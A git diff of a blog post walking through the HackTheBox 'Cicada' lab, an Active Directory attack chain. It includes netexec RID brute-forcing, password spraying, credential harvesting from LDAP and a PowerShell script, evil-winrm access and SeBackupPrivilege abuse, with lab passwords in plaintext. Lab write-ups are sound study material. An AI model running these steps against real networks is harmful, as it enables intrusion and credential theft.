@@ -1,5 +1,5 @@
 ---
-title: HackTheBox Cicada  Walkthrough 
+title: HackTheBox Cicada Walkthrough 
 date: 2025-01-22 19:27:02
 tags:
 - Writeup
@@ -14,13 +14,14 @@ tags:
 - htb Cicada
 description: "HackThebox Cicada  is easy Windows Active Directory box. it start off with enumerating SMB shares to find a new hire welcome note with a default password. RID-cycle to get a list of usernames, and spray that password to find a user still using it. With a valid user I can query LDAP to find another user with their password stored in their description. That user has access to a share with a dev script used for backup, and more creds. Those creds work to get a shell, and the user is in the Backup Operators group, so  exfil the registry hives and dump the machine hashes."
 ---
+
 ![HTB Cicada machine banner with cicada insect theme](../images/cicada.png)
----------
-# Introduction
+
+
+# _OVERVIEW
 Cicada is easy Windows Active Directory box. it start off with enumerating SMB shares to find a new hire welcome note with a default password. RID-cycle to get a list of usernames, and spray that password to find a user still using it. With a valid user I can query LDAP to find another user with their password stored in their description. That user has access to a share with a dev script used for backup, and more creds. Those creds work to get a shell, and the user is in the Backup Operators group, so  exfil the registry hives and dump the machine hashes.
 
  <!-- more -->
-----------------------------------
 
 
 | INFO|  |
@@ -34,6 +35,7 @@ Cicada is easy Windows Active Directory box. it start off with enumerating SMB s
 # INFORMATION GATHERING
 Information gathering reveals several ports open:
 ```
+nmap -p- 10.10.11.35 -sC -sV -oA cicada/nmap
 SMB 445
 RDP 3389
 <SNIP>
@@ -44,17 +46,15 @@ RDP 3389
 ### anonymous access
 
 Checking smb port for anonymous access:
-![](security/Screenshots/Pasted%20image%2020241216181737.png)
 
 
 SMB Share enumeration unveils a notice from HR file inside the HR share, let's check it out
-![](security/Screenshots/Pasted%20image%2020241216182316.png)
 note down the discovered default password: `Cicada$M6Corpb*@Lp#nZp!8`
 
 with anonymous access enabled to the smb server, we can try to discover users with `rid bruteforcing`.
 
 ```
-oxdf@hacky$ netexec smb CICADA-DC -u guest -p '' --rid-brute
+$ netexec smb CICADA-DC -u guest -p '' --rid-brute
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
 SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
@@ -68,7 +68,7 @@ SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (S
 ```
 cleaning the  users list with grep
 ```
-└─$ cat names |grep SidTypeUser| grep -oP '\\\K[^ ]+' > users-list.txt
+$ cat names |grep SidTypeUser| grep -oP '\\\K[^ ]+' > users-list.txt
 Administrator
 Guest
 krbtgt
@@ -80,30 +80,25 @@ david.orelious
 emily.oscars
 ```
 ##### checking password policy
-![](security/Screenshots/Pasted%20image%2020241217023442.png)   
 
 
  Now i'm going to run a spraying attack at smb with the curated list of users and the found default password:
-![](security/Screenshots/Pasted%20image%2020241216182736.png)
 Discovered: `michael.wrightson` user
 
 
 ## Credentialed Smb enumeration
 dumping all users:
-![](security/Screenshots/Pasted%20image%2020241217024546.png)
 it appears  david.orelious has left a gift for us, his Creds.
 `aRt$Lp#7t*VQ!3 `
-![](security/Screenshots/Pasted%20image%2020241217030335.png)
 Authenticated as david reveals the DEV share
 
 ## DEV SHARE ENUMERATION
 throughly enumerate content of the DEV share With the spider module:
 ```
-└─$ crackmapexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --spider DEV --regex .
+$ nxc smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --spider DEV --regex .
 ```
  ## Script file discovery
  Inspecting the output of spider, i found a script file with credentials of another user
-![](security/Screenshots/Pasted%20image%2020241217032915.png)
 
 i found a PS-Credential object with emily.oscars credentials:
 ```
@@ -112,9 +107,7 @@ $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
 $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
 ```
 test out  the credentials with evil-winrm:
-![](security/Screenshots/Pasted%20image%2020241217034219.png)
-#### user flag:
-![](security/Screenshots/Pasted%20image%2020241217034425.png)
+
 #### Privilege Escalation
 checking privileges
 ```
@@ -122,8 +115,6 @@ whoami /priv
 
 get-acl c:\users\administrator
 ```
-
-![](security/Screenshots/Pasted%20image%2020241217095700.png)
 
 The `SeBackupPrivilege` can be used to gain read access to any file According to microsoft docs
 there are many techniques avaiable to exploit this, but im going copy the hives registery manually using `reg`:
